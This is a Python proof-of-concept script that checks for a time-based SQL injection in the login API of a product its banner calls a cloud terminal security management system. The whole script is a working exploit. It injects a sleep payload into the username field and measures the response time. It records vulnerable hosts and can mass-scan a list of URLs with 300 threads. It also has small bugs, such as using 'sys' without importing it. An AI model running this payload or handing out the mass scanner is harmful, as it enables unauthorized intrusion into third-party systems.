# 
import requests,argparse,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 解除警告
GREEN = '\033[92m'
RESET = '\033[0m'
proxies = { 
       "http": "http://127.0.0.1:8080", 
       "https": "http://127.0.0.1:8080" 
       }
def banner():
	banner = """

	██████╗██╗  ██╗ ██████╗ ███████╗███████╗███╗   ██╗ ██╗
██╔════╝██║  ██║██╔═══██╗██╔════╝██╔════╝████╗  ██║███║
██║     ███████║██║   ██║███████╗█████╗  ██╔██╗ ██║╚██║
██║     ██╔══██║██║   ██║╚════██║██╔══╝  ██║╚██╗██║ ██║
╚██████╗██║  ██║╚██████╔╝███████║███████╗██║ ╚████║ ██║
 ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═══╝ ╚═╝
                                     info:云终端安全管理系统 login SQL注入漏洞
	"""
	print(banner)
def poc(target):
	payload_url = "/api/user/login"
	url = target + payload_url
	headers={
		'Content-Length': '102',
		'Sec-Ch-Ua': '"Chromium";v="109", "Not_A Brand";v="99"',
		'Accept': 'application/json, text/javascript, */*; q=0.01',
		'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
		'Accept-Encoding': 'gzip, deflate',
		'Accept-Language': 'zh-CN,zh;q=0.9'
	}
	data="captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*from(select+sleep(5))a)='"
	try:
		res = requests.get(url=target,verify=False)
		res1 = requests.post(url=url,headers=headers,data=data,verify=False)
		time = str(res1.elapsed.total_seconds())[0]
		if res.status_code == 200:
			if res1.status_code == 200 and '4' < time < '5':
				print(f"{GREEN}[+]该url存在SQL注入漏洞：{target}{RESET}")
				with open("result.txt","a",encoding="utf-8") as f:
					f.write(target+"\n")
			else:
				print(f"[-]该url不存在SQL注入漏洞：{target}")
		else:
			print(f"该url连接失败：{target}")
	except:
		print(f"[*]该url出现错误：{target}")

def main():
	banner()
	parser = argparse.ArgumentParser()
	parser.add_argument("-u","--url",dest="url",type=str,help="please write link")
	parser.add_argument("-f","--file",dest="file",type=str,help="please write file\'path")
	args = parser.parse_args()
	if args.url and not args.file:
		poc(args.url)
	elif args.file and not args.url:
		url_list = []
		with open(args.file,"r",encoding="utf-8") as f:
			for i in f.readlines():
				url_list.append(i.strip().replace("\n",""))
		mp = Pool(300)
		mp.map(poc,url_list)
		mp.close()
		mp.join()
	else:
		print(f"\n\tUage:python {sys.argv[0]} -h")


if __name__ == "__main__":
	main()